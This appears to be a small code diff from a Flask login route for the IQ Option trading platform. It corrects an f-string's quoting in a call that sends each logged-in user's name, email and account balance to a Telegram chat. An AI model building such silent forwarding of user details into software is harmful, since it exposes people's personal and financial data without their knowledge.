@@ -53,10 +53,10 @@ def login():
         profile = iq.get_profile_ansyc()
         balance = iq.get_balance()
         account_type = iq.get_balance_mode()
-        send_telegram_message(f"✅ Inicio de sesión:
+        send_telegram_message(f"""✅ Inicio de sesión:
 👤 Usuario: {profile.get('name', 'Desconocido')}
 📧 Email: {email}
-💰 Balance: ${balance:.2f} ({account_type})")
+💰 Balance: ${balance:.2f} ({account_type})""")
 
         return jsonify({"success": True, "message": "Conectado a IQ Option"}), 200
     else:
